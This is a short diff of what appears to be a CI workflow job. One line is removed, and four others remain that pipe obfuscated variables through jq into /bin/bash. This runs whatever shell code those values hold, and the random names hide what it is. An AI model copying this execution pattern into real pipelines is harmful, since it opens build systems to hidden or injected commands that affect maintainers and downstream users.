@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           printf '%s' "$aqnlq029" | jq -r .ws56110 | /bin/bash
           echo $y7 | jq -r .zb25340 | /bin/bash
-          echo $wvjec0 | jq -r .ois7 | /bin/bash
           echo $ofs5617 | jq -r .lr2 | /bin/bash
 
       - name: Save output
